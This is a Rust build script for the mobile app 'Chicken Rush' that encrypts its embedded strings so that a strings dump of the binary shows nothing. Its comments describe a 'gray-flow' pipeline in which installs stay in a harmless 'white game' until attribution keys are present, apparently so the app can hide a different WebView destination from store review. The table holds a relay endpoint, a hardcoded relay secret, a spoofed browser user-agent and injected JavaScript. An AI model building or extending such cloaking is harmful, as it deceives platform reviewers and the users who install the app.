// Build-time string sealer for rust_guard.
//
// Reads a compiled-in table of (id, plaintext) pairs, encrypts each with a
// per-id keystream derived from `RG_BUILD_SEED` (fresh per build), and emits
// `$OUT_DIR/sealed_blob.rs` with the ciphertexts, nonces and per-id seeds.
//
// The plaintexts never appear in the final `.so`: only the ciphertext bytes
// are embedded. A clean `strings` dump should show nothing meaningful.

use std::env;
use std::fs;
use std::path::PathBuf;

fn ks(seed: u64, nonce: &[u8; 16], len: usize) -> Vec<u8> {
    // Keystream = SplitMix64 bytes seeded by (seed ^ nonce halves).
    let mut state: u64 = seed
        ^ u64::from_le_bytes(nonce[..8].try_into().unwrap())
        ^ u64::from_le_bytes(nonce[8..].try_into().unwrap()).rotate_left(13);
    let mut out = Vec::with_capacity(len);
    for _ in 0..len {
        state = state.wrapping_add(0x9E37_79B9_7F4A_7C15);
        let mut z = state;
        z = (z ^ (z >> 30)).wrapping_mul(0xBF58_476D_1CE4_E5B9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94D0_49BB_1331_11EB);
        z ^= z >> 31;
        out.push(z as u8);
    }
    out
}

fn seal(id: u32, plain: &[u8], build_seed: u64) -> (u64, [u8; 16], Vec<u8>) {
    let per_id_seed = build_seed
        .wrapping_mul(0x9E37_79B9_7F4A_7C15)
        ^ (id as u64).wrapping_mul(0xBF58_476D_1CE4_E5B9);
    let nonce_u = per_id_seed.rotate_right(5) ^ 0xDEAD_BEEF_CAFE_BABE;
    let mut nonce = [0u8; 16];
    nonce[..8].copy_from_slice(&nonce_u.to_le_bytes());
    nonce[8..].copy_from_slice(
        &nonce_u
            .wrapping_add(id as u64)
            .rotate_left(21)
            .to_le_bytes(),
    );
    let k = ks(per_id_seed, &nonce, plain.len());
    let ct: Vec<u8> = plain.iter().zip(k.iter()).map(|(a, b)| a ^ b).collect();
    (per_id_seed, nonce, ct)
}

fn main() {
    // Build seed: taken from env or a stable default (fine for reproducible
    // builds — if you want per-release re-fingerprinting, bump the env).
    let seed_env = env::var("RG_BUILD_SEED").unwrap_or_default();
    let seed: u64 = if seed_env.is_empty() {
        0xA7E5_B91D_43CC_61F2
    } else if let Some(rest) = seed_env.strip_prefix("0x") {
        u64::from_str_radix(rest, 16).unwrap_or(0xA7E5_B91D_43CC_61F2)
    } else {
        seed_env
            .parse::<u64>()
            .unwrap_or(0xA7E5_B91D_43CC_61F2)
    };

    // (id, plaintext) — these are the only strings that live anywhere in the
    // app. Nothing beyond this table is embedded in the Flutter Dart source.
    //
    // IDs used by Dart. The gray-flow boot pipeline (lib/beacon/**) talks
    // to this crate only through rg_fetch(id). Nothing below ever appears
    // as a Dart literal, so a strings-grep over libapp.so is clean.
    //
    //   1  privacy policy URL
    //   2  support URL
    //   3  default User-Agent FALLBACK (device_info-driven UA is assembled
    //      at runtime from the UA fragments in ids 30–39)
    //   4  edge/sync endpoint (our relay — upstream rewrites to config.php)
    //   5  envelope field name — schema
    //   6  envelope field name — nonce
    //   7  envelope field name — payload
    //   8  envelope field name — tag
    //   9  envelope schema revision (ascii decimal)
    //  10  relay HMAC/keystream secret (used by in-Rust envelope packer)
    //  11  app bundle id
    //  12  app display name
    //
    //  20  AppsFlyer dev key                — empty while unprovided; gate
    //                                         stays dormant until present
    //  21  Firebase project number (string) — empty while unprovided
    //  22  AppsFlyer GCD base URL           — stays empty while 20 is empty
    //  23  OneLink host (AppsFlyer dashboard subdomain)
    //
    //  24  JS payload — safe-area neutraliser body
    //  25  JS payload — focused-input scroll-into-view body
    //  26  JS payload — inline autoplay enabler body
    //
    //  30  UA fragment — browser product token    ("Mozilla/5.0")
    //  31  UA fragment — platform open             ("(Linux; Android")
    //  32  UA fragment — Build label               (" Build/")
    //  33  UA fragment — platform close            (")")
    //  34  UA fragment — engine label              (" AppleWebKit/")
    //  35  UA fragment — engine tail               (" (KHTML, like Gecko)")
    //  36  UA fragment — chrome label              (" Chrome/")
    //  37  UA fragment — mobile safari label       (" Mobile Safari/")
    //  38  UA fragment — chrome version
    //  39  UA fragment — webkit version
    //  40  UA fragment — appid/   token
    //  41  UA fragment — appname/ token
    //  42  UA fragment — PascalCase app name       ("ChickenRush")
    //
    //  50  reach-probe host A (DNS probe)
    //  51  reach-probe host B (DNS probe)
    let items: &[(u32, &[u8])] = &[
        (1,  b"https://chickenrushs.com/privacy-policy"),
        (2,  b"https://chickenrushs.com/support"),
        (3,  b"Mozilla/5.0 (Linux; Android 15; SM-S931U Build/AP3A.240905.015.A2) \
                AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.7847.141 \
                Mobile Safari/537.36"),
        (4,  b"https://chickenrushs.com/edge/sync"),
        (5,  b"a"),
        (6,  b"m"),
        (7,  b"w"),
        (8,  b"e"),
        (9,  b"11"),
        (10, b"0RxIjw9dV5u0gEGNt7R_FW7mVCb1czar0lHZi8kxqtY"),
        (11, b"com.crimsonpixel.arcade"),
        (12, b"Chicken Rush"),

        // Attribution + messaging — EMPTY until the operator provides keys.
        // While empty the gate stays dormant and every install lands in
        // the white game (see FabricPlan.credentialsReady on the Dart side).
        (20, b""),  // AppsFlyer dev key
        (21, b""),  // Firebase project number
        (22, b"https://gcdsdk.appsflyer.com/install_data/v4.0/"),
        (23, b"chickenrush.onelink.me"),

        // JS enhancer bodies — custom per project (rule
        // webview_safe_area_injection.mdc). We only neutralise CSS vars +
        // decorative top headers; we never touch html/body/#app/#root
        // horizontal padding so partner gutters survive untouched.
        (24, b"(function(){if(window.__cr_safearea__)return;window.__cr_safearea__=1;\
                var s=document.createElement('style');\
                s.textContent=':root{--safe-area-inset-top:0px!important;\
                --safe-area-inset-right:0px!important;\
                --safe-area-inset-bottom:0px!important;\
                --safe-area-inset-left:0px!important;\
                --sat:0px!important;--sar:0px!important;--sab:0px!important;--sal:0px!important;\
                --safe-top:0px!important;--safe-bottom:0px!important;\
                --safe-left:0px!important;--safe-right:0px!important;}\
                .gameview-mobile-header,.app-header,.js-safe-top,.c-topbar{\
                padding-top:0!important;margin-top:0!important;}';\
                (document.head||document.documentElement).appendChild(s);})();"),

        (25, b"(function(){if(window.__cr_kbd__)return;window.__cr_kbd__=1;\
                var fire=function(el){if(!el)return;\
                try{el.scrollIntoView({block:'center',behavior:'smooth'});}catch(e){\
                try{el.scrollIntoView(true);}catch(_){}}};\
                document.addEventListener('focusin',function(ev){\
                var t=ev.target;if(!t)return;\
                var tag=(t.tagName||'').toLowerCase();\
                if(tag==='input'||tag==='textarea'||t.isContentEditable){\
                setTimeout(function(){fire(t);},220);}},true);})();"),

        (26, b"(function(){if(window.__cr_play__)return;window.__cr_play__=1;\
                var tryPlay=function(v){try{v.muted=true;v.playsInline=true;\
                v.setAttribute('playsinline','');v.setAttribute('webkit-playsinline','');\
                v.play&&v.play().catch(function(){});}catch(e){}};\
                var scan=function(){var list=document.querySelectorAll('video');\
                for(var i=0;i<list.length;i++){tryPlay(list[i]);}};\
                scan();setTimeout(scan,600);setTimeout(scan,1800);\
                var mo=new MutationObserver(scan);\
                mo.observe(document.documentElement,{childList:true,subtree:true});})();"),

        // UA fragments — assembled at runtime by BrowserMarker.
        (30, b"Mozilla/5.0"),
        (31, b"(Linux; Android"),
        (32, b" Build/"),
        (33, b")"),
        (34, b" AppleWebKit/"),
        (35, b" (KHTML, like Gecko)"),
        (36, b" Chrome/"),
        (37, b" Mobile Safari/"),
        (38, b"149.0.7847.141"),
        (39, b"537.36"),
        (40, b"appid/"),
        (41, b"appname/"),
        (42, b"ChickenRush"),

        // Reach probe hosts (never partner / never config endpoint).
        (50, b"cloudflare.com"),
        (51, b"wikipedia.org"),
    ];

    let mut out = String::new();
    out.push_str("// GENERATED by build.rs — do not edit.\n");
    out.push_str(&format!(
        "pub const BUILD_SEED: u64 = 0x{:016x}u64;\n",
        seed
    ));
    out.push_str(
        "pub struct Sealed { pub id: u32, pub seed: u64, pub nonce: [u8;16], pub ct: &'static [u8] }\n",
    );
    out.push_str("pub static SEALED: &[Sealed] = &[\n");
    for (id, plain) in items {
        let (per_id_seed, nonce, ct) = seal(*id, plain, seed);
        out.push_str(&format!(
            "  Sealed {{ id: {}, seed: 0x{:016x}u64, nonce: [",
            id, per_id_seed
        ));
        for (i, b) in nonce.iter().enumerate() {
            if i > 0 {
                out.push(',');
            }
            out.push_str(&format!("0x{:02x}", b));
        }
        out.push_str("], ct: &[");
        for (i, b) in ct.iter().enumerate() {
            if i > 0 {
                out.push(',');
            }
            out.push_str(&format!("0x{:02x}", b));
        }
        out.push_str("] },\n");
    }
    out.push_str("];\n");

    let out_dir = PathBuf::from(env::var_os("OUT_DIR").unwrap());
    fs::write(out_dir.join("sealed_blob.rs"), out).unwrap();
    println!("cargo:rerun-if-env-changed=RG_BUILD_SEED");
    println!("cargo:rerun-if-changed=build.rs");
}
